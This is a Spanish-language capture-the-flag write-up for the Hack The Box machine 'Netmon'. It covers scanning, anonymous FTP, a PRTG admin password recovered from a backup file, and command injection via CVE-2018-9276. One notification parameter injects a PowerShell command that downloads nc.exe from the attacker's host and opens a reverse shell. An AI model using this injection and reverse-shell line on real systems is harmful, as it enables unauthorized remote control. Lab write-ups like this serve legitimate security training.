@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Netmon :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Netmon     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [5.3,6.6,7,3,3.4] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/netmon/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Netmon :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Netmon     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [5.3,6.6,7,3,3.4] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/netmon/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Netmon :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Netmon     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [5.3,6.6,7,3,3.4] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/netmon/" />
+<meta property="og:site_name" content="Hack The Box - Netmon" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/netmon/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "https:\/\/sckull.github.io"
+        },
+        "articleSection" : "posts",
+        "name" : "Hack The Box - Netmon",
+        "headline" : "Hack The Box - Netmon",
+        "description" : "Nombre Netmon     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.152   Maker mrb3n      new Chart(document.getElementById(\x22radar-chart\x22), { type: \x27radar\x27, data: { labels: [\x22Enumeration\x22, \x22Real-Life\x22, \x22CVE\x22, \x22Custom Exploitation\x22, \x22CTF-Like\x22], datasets: [ { label: \x22User\x22, fill: true, backgroundColor: \x22rgba(179,181,198,0.2)\x22, borderColor: \x22rgba(179,181,198,1)\x22, pointBorderColor: \x22#fff\x22, pointBackgroundColor: \x22rgba(179,181,198,1)\x22, data: [5.3,6.6,7,3,3.4] }, { label: \x22Maker\x22, fill: true, backgroundColor: \x22",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2019",
+        "datePublished": "2019-06-29 00:00:00 \x2b0000 UTC",
+        "dateModified" : "2019-06-29 00:00:00 \x2b0000 UTC",
+        "url" : "https:\/\/sckull.github.io\/posts\/netmon\/",
+        "wordCount" : "987",
+        "keywords" : [ "hackthebox","nmap","FTP","hashcat","Powershell","PRTG","CVE-2018-9276","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2019-06-29 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/netmon/">Hack The Box - Netmon</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Saturday, Jun 29, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/ftp/">FTP</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/hashcat/">hashcat</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/powershell/">Powershell</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/prtg/">PRTG</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/cve-2018-9276/">CVE-2018-9276</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/netmon/../../image/htb/netmon/cover.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Netmon</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>20</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Facil</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.152</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [5.3,6.6,7,3,3.4]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [3,9,10,0,1]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Al realizar un escaneo con nmap nos muestra servicios ftp, http y puertos de windows.</p>
+
+<pre><code class="language-bash">root@sckull:~# nmap -sT -p- --min-rate 5000 10.10.10.152 -o tcp
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 18:59 GMT
+Warning: 10.10.10.152 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.152
+Host is up (0.24s latency).
+Not shown: 32841 closed ports, 32683 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49673/tcp open  unknown
+50315/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 169.37 seconds
+
+root@sckull:~# nmap -sC -p 21,80,135,139,445 -o nmap-ports.scan 10.10.10.152
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 19:03 GMT
+Nmap scan report for 10.10.10.152
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE
+21/tcp  open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+| 02-03-19  07:08AM       &lt;DIR&gt;          Users
+|_02-25-19  10:49PM       &lt;DIR&gt;          Windows
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp  open  http
+| http-title: Welcome | PRTG Network Monitor (NETMON)
+|_Requested resource was /index.htm
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+|_clock-skew: mean: 48s, deviation: 0s, median: 47s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-03-06 19:03:57
+|_  start_date: 2019-03-06 18:58:01
+
+Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
+</code></pre>
+
+<h2 id="ftp-puerto-21">FTP - Puerto 21</h2>
+
+<p>Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">root@sckull:~# ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls -lah
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+11-20-16  09:46PM       &lt;DIR&gt;          $RECYCLE.BIN
+02-02-19  11:18PM                 1024 .rnd
+11-20-16  08:59PM               389408 bootmgr
+07-16-16  08:10AM                    1 BOOTNXT
+02-03-19  07:05AM       &lt;DIR&gt;          Documents and Settings
+02-25-19  09:15PM       &lt;DIR&gt;          inetpub
+03-06-19  02:04PM            738197504 pagefile.sys
+07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs
+02-25-19  09:56PM       &lt;DIR&gt;          Program Files
+02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)
+02-25-19  09:56PM       &lt;DIR&gt;          ProgramData
+02-03-19  07:05AM       &lt;DIR&gt;          Recovery
+02-03-19  07:04AM       &lt;DIR&gt;          System Volume Information
+02-03-19  07:08AM       &lt;DIR&gt;          Users
+02-25-19  10:49PM       &lt;DIR&gt;          Windows
+226 Transfer complete.
+ftp&gt; cd Users
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-25-19  10:44PM       &lt;DIR&gt;          Administrator
+02-02-19  11:35PM       &lt;DIR&gt;          Public
+226 Transfer complete.
+ftp&gt; cd Public
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+02-03-19  07:05AM       &lt;DIR&gt;          Documents
+07-16-16  08:18AM       &lt;DIR&gt;          Downloads
+07-16-16  08:18AM       &lt;DIR&gt;          Music
+07-16-16  08:18AM       &lt;DIR&gt;          Pictures
+02-02-19  11:35PM                   33 user.txt
+07-16-16  08:18AM       &lt;DIR&gt;          Videos
+226 Transfer complete.
+ftp&gt; bin
+200 Type set to I.
+ftp&gt; get user.txt
+local: user.txt remote: user.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+33 bytes received in 0.37 secs (0.0877 kB/s)
+ftp&gt; 
+
+
+root@sckull:~# cat user.txt 
+dd58ce67b49e15105e88096c8d9255a5
+</code></pre>
+
+<h2 id="enumeracion-ftp">ENUMERACION FTP</h2>
+
+<p>Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado <code>PRTG Network Monitor</code> el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-11 19-26-10.png" alt="image" /></p>
+
+<h2 id="http-puerto-80">HTTP - puerto 80</h2>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-06 13-19-49.png" alt="image" /></p>
+
+<p>Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo &lsquo;PRTG Configuration.dat&rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo &lsquo;PRTG Configuration.old&rsquo;.</p>
+
+<p><a href="https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/"><strong>reddit/prtg_gave_away_some_of_your_passwords</strong></a></p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-11 19-37-34.png" alt="image" /></p>
+
+<p>Sabiendo esto buscamos dentro de la maquina los archivos, por lo general se encuentran en el misma direccion que el programa (<code>../Program Files/PRTG Network Monitor/PRTG configuration.dat</code>) pero, al parecer el administrador cambio la direccion. Para enumerar archivos de manera rapida utilizamos Filezilla.</p>
+
+<p>Los archivos los pudimos encontrar en <code>/Users/All Users/Paessler/PRTG Network Monitor</code>.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-11 19-42-17.png" alt="image" /></p>
+
+<p>Hicimos una busqueda de contraseñas dentro de los archivos y en <code>PRTG Configuration.old.bak</code> encontramos una contraseña para el usuario <code>prtgadmin</code>.</p>
+
+<pre><code class="language-bash">&lt;dbpassword&gt;
+	&lt;!-- User: prtgadmin --&gt;
+	    PrTg@dmin2018
+&lt;/dbpassword&gt;
+</code></pre>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-11 19-45-36.png" alt="image" /></p>
+
+<p>Al intentar logearnos con las credenciales (<code>prtgadmin:PrTg@dmin2018</code>) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (<code>PrTg@admin2018</code>) al actual &ndash;&gt; <code>PrTg@dmin2018</code></p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-13 16-55-17.png" alt="image" /></p>
+
+<p>Tenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.</p>
+
+<p><a href="https://www.codewatch.org/blog/?p=453"><strong>PRTG &lt; 18.2.39 Command Injection Vulnerability</strong></a></p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-13 17-07-17.png" alt="image" /></p>
+
+<p><code>Nos dirigimos a Setup &gt; Account Settings &gt; Notifications</code></p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-13 17-08-15.png" alt="image" /></p>
+
+<p>Creamos una nueva notificacion y marcamos la opcion de <code>EXECUTE PROGRAM</code>, dentro de los parametros escribimos lo siguiente:</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 06-03-30.png" alt="image" /></p>
+
+<pre><code class="language-powershell">C:\netcat.txt;powershell -c &quot;wget http://10.10.12.122/nc.exe -OutFile C:\nc.exe; C:\nc.exe 10.10.12.122 7878 -e cmd&quot;
+</code></pre>
+
+<p>Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar <code>nc.exe</code> (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 05-13-58.png" alt="image" /></p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 06-00-43.png" alt="image" /></p>
+
+<p>Observamos por medio del servicio ftp que el archivo <code>nc.exe</code> se creó exitosamente en <code>C:/nc.exe</code>.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 06-00-47.png" alt="image" /></p>
+
+<p>Y obtenemos una shell como administrador.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 06-00-50.png" alt="image" /></p>
+
+<p>Y nuestra bandera de <code>root.txt</code>.</p>
+
+<p><img src="../../image/htb/netmon/Screenshot from 2019-03-14 06-02-00.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/querier/">
+                <span class="button__text">Hack The Box - Querier</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
